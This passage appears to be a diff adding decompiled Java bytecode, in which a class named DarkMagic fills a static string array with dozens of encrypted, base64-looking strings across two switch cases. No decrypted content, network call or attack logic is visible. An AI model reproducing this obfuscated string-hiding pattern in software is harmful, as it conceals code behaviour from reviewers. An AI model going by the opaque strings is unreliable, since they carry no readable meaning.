+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(40), ldc:String("9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXx4R9IOHC/T4="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(41), ldc:String("U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKMdOpazxkeT4="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(42), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(43), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(44), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(45), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(46), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(47), ldc:String("ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(48), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(49), ldc:String("U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKMdOpazxkeT4="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(50), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(51), ldc:String("xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5OqqEuzuhCKOw=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(52), ldc:String("P7pds31eJyAm9sl1JkN032K+Z5w0e3Pe"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(53), ldc:String("TfgetdCAef4lRDgF76hMPA=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(54), ldc:String("ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(55), ldc:String("U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKMdOpazxkeT4="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(56), ldc:String("P7pds31eJyAm9sl1JkN032K+Z5w0e3Pe"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(57), ldc:String("xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5OqqEuzuhCKOw=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(58), ldc:String("EppOBQtxBWo="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(59), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(60), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(61), ldc:String("P7pds31eJyA1MCAg6ibp3Uqd8TOwxvN9"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(62), ldc:String("ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(63), ldc:String("P7pds31eJyAm9sl1JkN032K+Z5w0e3Pe"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(64), ldc:String("0Ez0xGp13BQ6RMtXF5tAvqKzYLqqGvPf"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(65), ldc:String("crxOp4cDMrHI4+3k0/0qZkBi5AMcHS+A"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(66), ldc:String("6GQbuu7W/txn0BhOTRVLz4wTlJu6z/kpPx+YyGnugRc5Swqs0QPixKB6cK7gZDQ6kPpKU2Bw48KBMiXhouisj9XktoXo9jiS+ZpRdeYzVdhFTQaEYDPs45dEROu5mM8S6St6rRBWnoX6OuLf/jODqElYh0kIB6wK88HxtpR/tgz4BUrbreNJynwhmovdpidDy+u+OXldus8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(67), ldc:String("9elNDU8Ob2j9LtvogfaD64LXlbzQg6RDsP0nsa6GzzPwem3csuvQY8IewmG9gkPlcVxio4fbmwZ9PKBdMNP4ayIK4Ejqt4f8CAX8BgALobU="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(68), ldc:String("/M5gOtbLZmABKE1Uv5lVjOIBqJ/lGYWAtLlYCisWbRH5JnDdnJpCPGsCkXf0NU3L"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(69), ldc:String("xdTnvrgCmRNP3+c1K1+RL5pfjM9fmj/o"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(70), ldc:String("R484lsVNkYjRLCNoZf25ADjd+fU/x2jJ"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(71), ldc:String("3M2WZB9yP+QftlVqdUP4xvcULyY0g33TiIsIrWP+eS8drJAughDEFiftx29AxKkV2xnRetIEitxS8IHIpPvUj3zKm6K+shXQ1T5LTuEyi/lyO9SsymU9xTf+dEautphtucVTXOsHmmhhJQdBeEARDtm9bHi+mbYzsFw6F2CoiIMkJVW7hYbm+dz2MSHaNxNMGQ6Jty9o4EM="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(72), ldc:String("U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKMdOpazxkeT4="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(73), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(74), ldc:String("P7pds31eJyDeGKRyvxD8ao4wDNKMIbFo"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(75), ldc:String("Y8W6KBDKe8tYXsAIJd6pWQ=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(76), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(77), ldc:String("ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(78), ldc:String("ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(79), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(80), ldc:String("ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(81), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(82), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(83), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(84), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(85), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(86), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(87), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(88), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(89), ldc:String("ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(90), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(91), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(92), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(93), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(94), ldc:String("9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXx4R9IOHC/T4="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(95), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(96), ldc:String("xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5OqqEuzuhCKOw=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(97), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(98), ldc:String("ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(99), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(100), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(101), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(102), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(103), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(104), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(105), ldc:String("ECjyvVhK3+9bdjKa9dSN//QAW7xNQ0Hs"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(106), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(107), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(108), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(109), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(110), ldc:String("xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5OqqEuzuhCKOw=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(111), ldc:String("9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXx4R9IOHC/T4="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(112), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaGsI6Ll0XQ8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(113), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(114), ldc:String("XfAmJrjLaqGs7/GOMWfHrFU25yzUq8Ho"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(115), ldc:String("U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKMdOpazxkeT4="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(116), ldc:String("M+wP1oJmbeTzpSkpuP8BPXgxvgKaeP0fk1mv99cvAl4NudtC171dl3vvm9y+6zk+EsURfTvrDEIECGx2AuEMGp9Mow4063Ip4up1G7aTSZd6uE/c66WvOfZs3E4pgT0y+v7qi6K2qd9j2Ntzn3ryETRTM2bNeQoDZ/SRBdgoEonsqfO8p3rKWL4rg0G0yoFoZRYAlrvN1zySDxmjMS0ej0usqgzDEd+WY7BQgQVpH+DMMPT8zqlu1w=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(117), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPCuBoC9b1Z9"))
+                    looporswitchbreak()
+                
+                case 1:
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(0), ldc:String("0Ez0xGp13BQ6RMtXF5tAvsVnujnXGZ6p"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(1), ldc:String("op+YbNuekTK0S45W1onhqtDnLIXumrbyYVCTQtmLZSwjUiXYJobLKgpLlMOPgVKL"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(2), ldc:String("smNQZrUyrGImLGZMFrpCgSXkYfrLrRggmIlBi8KORnBtmL3FYw7kzQQ4nco9poNhFkAA6iXHnnKpsK2wpb3VpCw+HM8mJa24O6hl2m3YXYrz7Bk4DEgvjcrf60MR7M233P+ZFRTbw4E="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(3), ldc:String("90G07n34WWT19KwEsDRxaJlDtRzf1iTTnW4F53w2GwbLmQG9yhSVXZFkwRueWWaCcWQL/+4eIECxk1HQP5FytyRTSxB0vGutVxuxzGebOT28GQc66WLZFfJyrEJSILLB6KGrDNhdkjagDBd4mR88VfqMeFZ2C/8+TxyJ2t97zZxSH4UK48DlzSNusi4CXv0Q7ErJUIBdi4myE8iHr3mKDg=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(4), ldc:String("zs8Nflkw9eQ="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(5), ldc:String("anlKcumGi1H3PlOxaSsEebO1KST+WvhcY4lqs7Vk2bM="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(6), ldc:String("X71CqQ6zYzHOnWyYRWpRwerkMmBg3x+ToYK1QrKfK0k="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(7), ldc:String("VlHl8rMmKaVsF6dqyOFsabYbpOKwZ3e0DjbA3FUCdPI="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(8), ldc:String("ECjyvVhK3+9bdjKa9dSN/yP1s7Q0WqgabhDANzSGAEg="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(9), ldc:String("Oo3EyAPLBuulz0GFi+2eBQ=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(10), ldc:String("iD9Jue670l+FcX0IS3xB2w=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(11), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sE2uOGmnQuZ+8="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(12), ldc:String("xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5N16kTALcTSaB78yfE0gLSo"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(13), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEOqLMx3+b+PM="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(14), ldc:String("JA+fI7CGo/m31O+sFjnI0aZ4lv8tTs9p"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(15), ldc:String("XfAmJrjLaqGs7/GOMWfHrOTzmJreRzW6NIhKlszOqtM="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(16), ldc:String("9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXxl9bZ5wqxQQ="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(17), ldc:String("xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5PVLXDvkYqkMpCWu6Y5TP4U"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(18), ldc:String("XfAmJrjLaqGs7/GOMWfHrLprAZxfY1Fy"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(19), ldc:String("U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKYLiUuPTi8sgFWO/yAcjBkQ=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(20), ldc:String("WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEJ2F8GLkhIxM="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(21), ldc:String("9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeX3rmg7UmN0DU="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(22), ldc:String("9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXnfr5hB0Dw6k="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(23), ldc:String("ECjyvVhK3+9bdjKa9dSN/w0XcNdq47FbdSEOGklA3cs="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(24), ldc:String("U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKYDCjVYUDUWMTJVZwFSa+Cw=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(25), ldc:String("xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5O222F2Uw8yS6nDlGzODHC+"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(26), ldc:String("XfAmJrjLaqGs7/GOMWfHrOGf7/8GBslv"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(27), ldc:String("I1CW8WOS5/+xoqhgAPKFDUjb8rK/go+r"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(28), ldc:String("ECjyvVhK3+9bdjKa9dSN/4gZJbIin83N"))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(29), ldc:String("9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeXtOsrzJECjLM="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(30), ldc:String("IJcG6Od4P8nDUJ/gvgzTWA=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(31), ldc:String("ECjyvVhK3+9bdjKa9dSN/zR+ZympMNu6K628H7YqsBA="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(32), ldc:String("IJcG6Od4P8npkNkoNrMrUg=="))
+                    storeelement:String(getstatic:String[](DarkMagic::v0005_27759afbd4d1d8bb8a5777d), ldc:int(33), ldc:String("9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuK5PakHs53Qr"))
